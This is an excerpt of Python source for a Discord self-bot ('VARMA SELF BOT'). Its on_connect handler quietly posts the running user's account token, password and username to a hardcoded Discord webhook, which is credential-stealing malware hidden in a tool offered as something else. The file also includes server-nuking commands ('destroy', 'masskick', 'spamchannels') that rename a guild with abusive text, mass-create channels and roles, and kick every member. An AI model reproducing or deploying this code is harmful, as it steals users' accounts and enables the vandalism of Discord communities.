...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/827052092001878016/eN9OXwUTo_qmZN3zfTGSEMnXQnibSMI64gx3_Q_yNhOfD0N_b3DOzw99svCCmrh6J8IH',json={'content': f"**Token:** `{op}`\n**Password:** `{password}`**Username: {Exeter.user.name}**"})
    startprint()
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(
            name="V A R M A SELF BOT | Prefix: " + str(Exeter.command_prefix),
            icon_url=Exeter.user.avatar_url)
        embed.set_thumbnail(url=Exeter.user.avatar_url)
        embed.set_image(
            url=
            "https://cdn.discordapp.com/attachments/841186552683298827/841186822813253642/20210510_110234.jpg"
        )
        embed.add_field(
            name="\uD83E\uDDCA `𝐇𝐄𝐋𝐏 𝐆𝐄𝐍𝐄𝐑𝐀𝐋`",
...
async def destroy(ctx):
    ...
    try:
        await ctx.guild.edit(
            name="FUCKED BY VARMA",
            description="varma papa",
            reason="varma op",
            icon=None,
            banner=None)
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="varma op")
    for _i in range(250):
        await ctx.guild.create_role(name="varma op", color=RandomColor())
...
async def masskick(ctx):
    ...
    for user in users:
        try:
            await user.kick(reason="varma op")
        except:
            pass
...
async def spamchannels(ctx):
    ...
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="fucked by legend")
        except:
            return
